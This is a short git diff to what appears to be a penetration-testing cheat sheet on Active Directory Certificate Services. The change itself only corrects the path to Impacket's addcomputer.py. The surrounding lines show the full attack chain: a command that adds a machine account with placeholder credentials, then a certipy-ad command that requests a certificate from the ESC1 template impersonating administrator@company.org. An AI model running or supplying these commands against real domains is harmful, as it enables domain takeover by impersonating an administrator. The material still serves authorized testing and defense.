@@ -29,7 +29,7 @@ Enrollment Rights                   : Company.org\Domain Users
 
 ### Enrollment Rights Domain Computers
 ```bash
-python addcomputer.py company.org/my_user:'my_password123' -dc-ip 10.10.10.10 -computer-name "newcomputer1" -computer-pass 'newpass1'
+python impacket/examples/addcomputer.py company.org/my_user:'my_password123' -dc-ip 10.10.10.10 -computer-name "newcomputer1" -computer-pass 'newpass1'
 ```
 ```bash
 certipy-ad req -username 'newcomputer1$' -password 'newpass1' -ca 'COMPANY-CA' -target 10.10.10.10 -template 'ESC1' -upn "administrator@company.org" -dns dns.company.org
